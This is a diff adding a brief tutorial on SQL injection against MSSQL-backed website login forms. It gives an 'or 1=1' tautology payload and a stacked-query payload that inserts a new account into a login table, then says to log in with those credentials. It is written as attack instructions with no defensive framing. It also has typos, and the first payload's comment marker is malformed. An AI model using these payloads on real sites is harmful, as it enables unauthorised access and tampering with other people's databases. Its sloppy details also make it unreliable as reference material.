@@ -1,0 +1,16 @@
+SQL Injection is a technique often used to attack a website and it is also the must common website vulnerability on the Internet.
+
+1- SQL Injection Attacks on MSSQL Database
+
+Type the query: 
+username: blah' or 1=1 - 
+password: leave it empty
+This would through an error 
+
+username: blah';insert into login values ('john','apple123');--
+password: leave it empty
+This will create a user account.
+
+Logging into the site using the new site: 
+username: john
+password: apple123
